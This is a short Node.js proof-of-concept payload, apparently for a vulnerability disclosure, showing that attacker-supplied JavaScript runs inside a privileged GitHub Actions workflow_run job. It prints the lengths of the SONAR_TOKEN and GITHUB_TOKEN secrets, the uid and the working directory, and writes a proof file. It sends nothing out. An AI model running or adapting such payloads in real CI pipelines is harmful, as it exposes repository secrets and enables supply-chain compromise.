const fs = require('fs');
console.log('=== GAB-POC RCE: attacker-controlled sonar action JS executed ===');
console.log('SONAR_TOKEN_LEN=' + (process.env.SONAR_TOKEN || '').length);
console.log('GITHUB_TOKEN_LEN=' + (process.env.GITHUB_TOKEN || '').length);
console.log('uid=' + process.getuid() + ' cwd=' + process.cwd());
try {
  fs.writeFileSync((process.env.GITHUB_WORKSPACE || '/tmp') + '/RCE_PROOF.txt',
    'executed attacker JS in privileged workflow_run\n');
} catch (e) { console.log('write failed: ' + e.message); }
process.exit(0);
